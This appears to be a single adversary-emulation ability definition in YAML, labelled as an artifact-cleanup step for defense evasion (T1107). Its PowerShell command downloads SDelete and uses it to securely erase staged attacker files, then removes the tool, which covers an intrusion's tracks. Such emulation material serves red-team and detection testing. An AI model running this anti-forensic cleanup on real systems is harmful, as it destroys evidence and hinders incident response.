- id: 208b021b-c79a-4176-8ad1-3af99ed50c6f
  name: 9.C - Artifact Cleanup - Delete Staged Files
  description: Cleanup files related to Operation
  tactic: defensive-evasion
  technique:
    attack_id: T1107
    name: File Deletion
  platforms:
    windows:
      psh,pwsh:
        command: "\n\nif (!$(test-path -path \"C:\\Program Files\\SysInternalsSuite\"\
          )) {\n  mkdir \"C:\\Program Files\\SysInternalsSuite\";\n}\nset-location\
          \ \"C:\\Program Files\\SysInternalsSuite\";\n\nif (!$(test-path -path \"\
          sdelete64.exe\")) {\n  iwr -uri \"https://download.sysinternals.com/files/SDelete.zip\"\
          \ -outfile sdelete64.zip;\n  Expand-Archive sdelete64.zip -force;\n}\ncopy\
          \ sdelete64.exe C:\\Windows\\Temp\\;\ncd C:\\Windows\\Temp\\ ;\n.\\sdelete64.exe\
          \ /accepteula C:\\Windows\\Temp\\Rar.exe;\n.\\sdelete64.exe /accepteula\
          \ C:\\Users\\#{profile_user}\\AppData\\Roaming\\working.zip;\n.\\sdelete64.exe\
          \ /accepteula C:\\Users\\#{profile_user}\\Desktop\\working.zip;\nremove-item\
          \ C:\\Windows\\Temp\\sdelete64.exe -force;\n"
